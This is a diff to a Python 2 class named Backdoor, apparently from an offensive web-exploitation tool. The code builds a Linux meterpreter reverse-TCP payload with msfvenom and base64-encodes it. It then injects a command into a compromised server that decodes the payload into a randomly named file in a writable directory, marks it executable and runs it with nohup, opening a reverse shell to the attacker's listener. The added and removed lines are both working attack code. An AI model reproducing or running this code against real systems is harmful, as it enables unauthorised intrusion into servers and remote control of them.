@@ -39,14 +39,22 @@ class Backdoor(object):
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
         else:
             print '\n{0}[i] Found the metasploit framework!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
-            print '[i] Generating linux/x86/meterpreter/reverse_tcp'
-            #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-            shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-            cmd = 'echo "{0}" | base64 -i -d > /tmp/1 && chmod +x /tmp/1 && nohup /tmp/1 &'.format(shell)
-            self.check = make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            folder = linux.get_writble_dir()
+            if folder:
+                import random, string
+                filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
+                exe = '{0}/{1}'.format(folder, filename)
+                print '\n{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+                raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+                print '[i] Generating linux/x86/meterpreter/reverse_tcp'
+                #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+                shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, exe)
+                print '\n{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
+                make_request.get_page_source(cmd)
+                print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
+                
     def netcat(self, ip, port):
         '''
         nc openbsd deosn't have -e switch
